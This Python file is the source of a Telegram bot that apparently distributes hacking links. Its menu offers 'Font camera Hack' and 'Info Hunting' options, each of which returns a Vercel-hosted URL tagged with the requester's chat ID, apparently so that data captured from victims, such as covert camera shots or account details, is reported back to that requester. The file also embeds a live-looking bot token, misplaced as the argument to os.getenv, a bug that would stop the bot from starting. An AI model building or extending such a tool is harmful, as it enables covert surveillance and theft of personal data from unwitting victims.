import os
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, ContextTypes

BOT_TOKEN = os.getenv("8640372051:AAEc4IEM7sTu_k9bpNwNZ1p7OJSFdvHORK4")

DEVELOPER_TEXT = (
    "Developer Info\n"
    "Account Link: https://www.facebook.com/md.raselroni.888"
)

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    keyboard = [
        [
            InlineKeyboardButton("Font camera Hack📸", callback_data="a"),
            InlineKeyboardButton("Info Hunting", callback_data="b"),
 
        ]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)

    await update.message.reply_text(
        "Choose a menu:",
        reply_markup=reply_markup
    )

async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()

    user_chat_id = query.from_user.id

    if query.data == "a":
        await query.message.reply_text(
            f"https://font-cm.vercel.app/?id={user_chat_id}"
        )

    elif query.data == "b":
        await query.message.reply_text(
            f"https://instagram1-two.vercel.app/?id={user_chat_id}"
        )


def main():
    if not BOT_TOKEN:
        raise ValueError("BOT_TOKEN not found. Set it in Railway Variables.")

    app = Application.builder().token(BOT_TOKEN).build()

    app.add_handler(CommandHandler("start", start))
    app.add_handler(CallbackQueryHandler(button_handler))

    print("Bot is running...")
    app.run_polling()

if __name__ == "__main__":
    main()